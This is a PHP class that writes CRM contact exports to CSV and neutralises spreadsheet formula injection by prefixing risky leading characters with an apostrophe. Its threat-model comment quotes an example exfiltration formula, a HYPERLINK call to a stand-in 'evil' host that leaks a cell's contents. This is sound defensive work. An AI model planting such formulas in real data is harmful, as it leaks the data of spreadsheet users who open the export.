<?php

declare(strict_types=1);

namespace App\Support;

use InvalidArgumentException;

/**
 * P6-B1 CSV writer.
 *
 * FORMULA INJECTION IS THE THREAT MODEL. A CRM export is opened in Excel, Numbers or
 * LibreOffice by an operator, and those applications evaluate a cell beginning with
 * `=`, `+`, `-` or `@` as a FORMULA. A contact whose stored name is
 * `=HYPERLINK("https://evil/"&A1)` would therefore execute inside the operator's
 * spreadsheet — an exfiltration path that never touches this application at all.
 *
 * Neutralisation is a leading apostrophe, which every mainstream spreadsheet treats as
 * "the rest is literal text". CSV quoting alone is NOT a defence: `"=1+1"` is still
 * parsed as a formula once the quoting is stripped by the importer.
 *
 * TAB, CR and LF are included because they are trimmed or reinterpreted during import
 * and paste, which can shift a payload to the start of a cell and re-arm it.
 */
final class CrmExportCsvWriter
{
    /** Characters that make a spreadsheet treat a cell as an expression. */
    public const DANGEROUS_PREFIXES = ['=', '+', '-', '@', "\t", "\r", "\n"];

    /** Columns are declared per kind, never derived from a row, so a new database
     *  column can never appear in an export by accident. */
    public const COLUMNS = ['contact_id', 'public_id', 'email', 'status', 'origin', 'created_at'];

    /**
     * @param  resource  $stream
     * @param  list<string|int|null>  $row
     */
    public static function writeRow($stream, array $row): void
    {
        // RFC 4180 line endings so the file opens identically on Windows and Unix.
        fputcsv($stream, array_map(self::neutralise(...), $row), ',', '"', '\\', "\r\n");
    }

    /**
     * Neutralise one cell.
     *
     * NULL becomes an empty field rather than the string "": an anonymized contact has
     * no e-mail at all, and writing a literal "NULL" or "-" would invent a value.
     */
    public static function neutralise(string|int|null $value): string
    {
        if ($value === null || $value === '') {
            return '';
        }

        if (is_int($value)) {
            return (string) $value;
        }

        // Only the FIRST character decides: a spreadsheet parses a cell as a formula
        // solely on its leading character, so a mid-string '=' is harmless literal text
        // and must not be mangled.
        return in_array($value[0], self::DANGEROUS_PREFIXES, true)
            ? "'".$value
            : $value;
    }

    /**
     * Header row for a given export kind.
     *
     * @return list<string>
     */
    public static function header(string $kind): array
    {
        if (! in_array($kind, ['crm_contacts', 'segment_current_members'], true)) {
            throw new InvalidArgumentException('Unknown export kind.');
        }

        return self::COLUMNS;
    }
}
